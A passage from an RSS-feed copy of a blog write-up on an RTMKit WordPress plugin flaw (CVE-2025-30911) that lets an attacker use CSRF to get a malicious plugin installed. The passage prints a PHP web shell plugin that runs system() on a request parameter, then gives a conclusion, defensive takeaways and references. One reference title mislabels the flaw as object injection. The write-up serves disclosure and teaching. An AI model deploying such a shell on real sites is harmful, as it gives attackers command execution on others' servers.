data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ABSPATH&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;init&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Trigger RCE&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-03-cve-2025-30911/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-03-cve-2025-30911/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-03-cve-2025-30911/result.png&#39; alt=&#34;Result&#34; height=&#34;813&#34; width=&#34;1249&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability in &lt;strong&gt;RTMKit &amp;lt;= 1.5.4&lt;/strong&gt; lies in the &lt;code&gt;install_requirements()&lt;/code&gt; function, where the value of &lt;code&gt;$_POST[&#39;plugin&#39;]&lt;/code&gt; is processed directly to install and activate a plugin without sufficient validation. Version &lt;strong&gt;1.5.4&lt;/strong&gt; introduced a permission check using &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt;, but still lacked &lt;strong&gt;CSRF&lt;/strong&gt; protection, allowing an attacker to abuse a logged-in &lt;strong&gt;Administrator&lt;/strong&gt; to send a hidden request and install a malicious plugin. It was only in &lt;strong&gt;v1.5.5&lt;/strong&gt; that the addition of &lt;code&gt;wp_verify_nonce()&lt;/code&gt; fully addressed the issue and prevented the risk of &lt;strong&gt;RCE&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always validate both permissions and &lt;strong&gt;nonces&lt;/strong&gt; for every AJAX endpoint.&lt;/li&gt;&#xA;&lt;li&gt;Never process direct user input for sensitive operations such as installing/activating plugins.&lt;/li&gt;&#xA;&lt;li&gt;Permission checks alone are not enough; &lt;strong&gt;CSRF&lt;/strong&gt; protection is also required.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/rometheme-for-elementor/vulnerability/wordpress-romethemekit-for-elementor-plugin-1-5-4-arbitrary-plugin-installation-activation-to-rce-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress RTMKit Plugin &amp;lt;= 1.5.4 is vulnerable to PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
